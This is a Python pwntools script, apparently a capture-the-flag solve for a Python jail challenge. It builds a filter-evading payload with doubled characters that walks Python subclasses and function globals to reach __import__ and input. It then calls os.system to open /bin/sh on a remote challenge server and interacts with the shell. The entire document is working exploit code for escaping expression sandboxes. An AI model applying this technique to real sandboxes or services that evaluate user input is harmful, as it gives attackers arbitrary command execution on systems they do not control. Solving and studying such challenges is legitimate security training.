```python
from pwn import *

r = lambda x: ''.join(c * 2 for c in x)

def get_subclass(index):
    return f'(()).x{r("__class__")}.x{r("__base__")}.x{r("__subclasses__")}(())[[{r(str(index))}]]'

def get_subclass_globals(index):
    return f'{get_subclass(index)}.x{r("__init__")}.x{r("__globals__")}'

def get_builtins_dict():
    _list = get_subclass(7)
    builtins_str = f'{_list}(({get_subclass_globals(80)}))[[55]]'
    builtins_dict = f'{get_subclass_globals(80)}[[{builtins_str}]]'
    return builtins_dict

def get_builtin_fn(index):
    _list = get_subclass(7)
    builtins_dict = get_builtins_dict()
    fn_str = f'{_list}(({builtins_dict}))[[{r(str(index))}]]'
    fn = f'{builtins_dict}[[{fn_str}]]'
    return fn


import_fn = get_builtin_fn(6)
input_fn = get_builtin_fn(28)
code = f'{import_fn}(({input_fn}(()))).x{r("system")}(({input_fn}(())))'

# s = remote('localhost', 5000)
s = remote('mc.ax', 31421)
s.sendlineafter(b': ', code.encode())
s.sendline(b'os')
s.sendline(b'/bin/sh')
s.interactive()
```